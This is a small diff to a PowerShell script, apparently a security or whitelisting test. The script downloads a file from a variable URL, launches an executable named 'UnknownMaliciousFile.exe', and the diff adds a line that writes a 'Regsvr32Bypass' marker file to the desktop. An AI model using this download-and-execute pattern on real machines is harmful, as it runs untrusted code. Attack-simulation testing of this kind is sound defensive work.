@@ -9,3 +9,5 @@ wget $url -outfile $output
 Write-Output "Time taken: $((Get-Date).Subtract($start_time).Seconds) second(s)"
 
 Start-Process -FilePath "UnknownMaliciousFile.exe"
+
+$DesktopPath = [Environment]::GetFolderPath('Desktop');echo "Regsvr32Bypass" >> $DesktopPath\\WLtester.txt
